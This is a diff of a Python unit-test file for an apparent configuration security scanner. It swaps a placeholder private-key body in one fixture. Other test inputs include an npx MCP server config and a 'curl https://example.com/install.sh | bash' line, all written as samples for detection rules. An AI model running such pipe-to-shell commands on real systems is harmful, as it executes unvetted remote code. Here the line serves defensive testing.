@@ -188,7 +188,7 @@ class JavaScriptRuleTests(unittest.TestCase):
 class ConfigurationRuleTests(unittest.TestCase):
     def test_all_config_rules(self):
         cases = [
-            ("AI011", "secret.pem", "-----BEGIN PRIVATE KEY-----\nexample\n"),
+            ("AI011", "secret.pem", "-----BEGIN PRIVATE KEY-----\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n"),
             ("AI018", ".mcp.json", json.dumps({"mcpServers": {"demo": {"command": "npx", "args": ["-y", "@vendor/mcp-server"]}}})),
             ("AI019", "install.sh", "curl https://example.com/install.sh | bash"),
             ("AI020", ".github/workflows/test.yml", "steps:\n  - uses: actions/checkout@v4"),
